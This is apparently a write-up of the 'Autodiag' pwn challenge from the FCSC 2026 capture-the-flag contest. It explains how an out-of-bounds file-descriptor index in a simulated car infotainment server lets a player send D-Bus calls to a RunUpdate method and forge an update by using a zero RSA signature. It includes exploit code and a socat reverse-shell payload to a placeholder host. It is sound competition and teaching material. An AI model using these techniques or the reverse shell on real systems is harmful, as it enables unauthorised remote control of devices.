+++
title = "FCSC 2026 | Autodiag"
+++

# [Pwn] Autodiag | FCSC 2026

- Level: ⭐⭐
- Solves: 13
- Description:
  > Il a l'air intéressant ce port de debug.
  > Note : la VM de l'épreuve a accès à Internet.
- Exploit: [exploit.py](https://transfer.0xb0tm4n.org/inline/AbGrScp6Qu/exploit.py)

---

- [1. TL;DR](#TLDR)
- [2. Full explanation](#full-explanation)
  - [2.1 The protocol](#protocol)
  - [2.2 The bug](#the-bug)
  - [2.3 DBUS](#dbus)
  - [2.4 RunUpdate](#runupdate)

## TLDR

- use OOB for fd selection in resp function to point to dbus fd
- send dbus packets to call `RunUpdate` method on service `com.acme.ivi.ServiceManager`
- forge a working payload to execute a revshell

## Full explanation

### Protocol

The protocol was fairly simple, the first 20 bytes were the header and it consisted of a magic header `0IVI` followed by the version of the protocol (1) and then the op, size and id encoded as 32 bits integer.

After the header we just had to send our actual payload. So I used flat from pwntools to generate the frames like this:

```py
data = flat({
    0: 0x30495649,
    4: 1,
    8: op,
    12: size,
    16: id,
}, word_size=32)
data += body
```

### The bug

So after a quick look at every possibles operations in `ivi_server.c` (and they were a lot of them) we could see this in the `resp()` function that corresponded to `OP_RESP`

```c
target_fd = st->conn_fds[idx];
```

and that was really interesting as the idx value wasn't checked before so we could use it to OOB and connect to arbitrary fd.

Luckily, this was really interesting in our case as the server was using a dbus connection to interact with the actual car, and the fd that was used to send dbus packet was 3, using this precious information I used gdb to search for this value '\x03\x00\x00\x00' relative to the `st->conn_fds` array, I found quite a lot of them and ended up trying 15 different offsets.

### DBUS

So now we could directly communicate to the `com.acme.ivi.ServiceManager` service, the code for this service was defined into `ivi_dbusd.cpp` and two method directly caught my eyes, `RunUpdate` and `RunSelfTest`, the two were invoking other binary using execv and seemed to be usable to gain RCE, although `RunSelfTest` was a little weird I ended up finding no bugs in it and going into the `RunUpdate` way. This one was passing the body of the method call to a binary called `ivi_update_runner`.

To communicate through the socket we could forge the packets using `dbus-next` lib:

```py
payload = Message(
    message_type=MessageType.METHOD_CALL,
    destination='com.acme.ivi.ServiceManager',
    path='/com/acme/ivi/ServiceManager',
    interface='com.acme.ivi.ServiceManager',
    member='RunUpdate',
    signature='s',
    body=[body],
    serial=216
)
payload = payload._marshall(negotiate_unix_fd=False)
```

The only tricky part here was to figure out that the serial number was needed to have a valid communication.

### RunUpdate

So lastly we had to look at `ivi_update_runner.cpp`, inside the code was defined a file update format:

```c
[0x0] UPD0: magic
[0x4] h_size: 32 bits len of the signature
[0x8] header: data
[h_size] signature: SHA256 of the header value encrypted using RSA
[h_size+0x100] key: AES key encrypted using RSA
[h_size+0x200] payload: AES encrypted zlib archive of the update payload
```

Another interesting bit was the RSA decryption function:

```cpp
static std::vector<uint8_t> rsa_public_raw_256(RSA *rsa, const uint8_t *sig256) {
    const BIGNUM *n = nullptr;
    const BIGNUM *e = nullptr;
    RSA_get0_key(rsa, &n, &e, nullptr);

    BIGNUM *S = BN_bin2bn(sig256, (int)RSA_BYTES, nullptr);

    [...]

    if (BN_mod_exp(M, S, e, n, ctx) != 1) {
        BN_free(M);
        BN_free(S);
        BN_CTX_free(ctx);
        throw std::runtime_error("BN_mod_exp failed");
    }

    int mlen = BN_num_bytes(M);
    std::vector<uint8_t> tmp((size_t)mlen);
    BN_bn2bin(M, tmp.data());
    if ((size_t)mlen > RSA_BYTES) {
        BN_free(M);
        BN_free(S);
        BN_CTX_free(ctx);
        throw std::runtime_error("rsa output too large");
    }

    memset(out.data(), 0, RSA_BYTES);
    memcpy(out.data() + (RSA_BYTES - (size_t)mlen), tmp.data(), (size_t)mlen);

    BN_free(M);
    BN_free(S);
    BN_CTX_free(ctx);
    return out;
}
```

As we can see the last operation on the `M` value before returning is `BN_mod_exp(M, S, e, n, ctx)` that just does a `M = S^e % n` so if we set the S value to 0 then the AES key would be full null bytes so we didn't have to know anything about the private key.

Using all of this knowledge we could then use the provided `update.bin` headers to have a valid header+signature combo and then set the AES key to `'\x00'*0x100` and last but not least our payload compressed and encrypted using the null byte's AES key + null byte's IV.

```py
revshell= b"#!/bin/sh\nsocat TCP:HOST:PORT EXEC:'/bin/bash -p'"
header = open('./update.bin', 'rb').read(0x100+0x100)
cipher = AES.new(b'\x00'*0x20, AES.MODE_CBC, iv=b'\x00'*16)
ct = cipher.encrypt(pad(compress(revshell, wbits=16+MAX_WBITS), 16, style='pkcs7'))
update = flat(
    header,
    b'\x00'*0x100, # aes key
    ct
)
```

So we just had to encode this in base64 and send it through the dbus using previous vuln the shell popped directly into the listener !
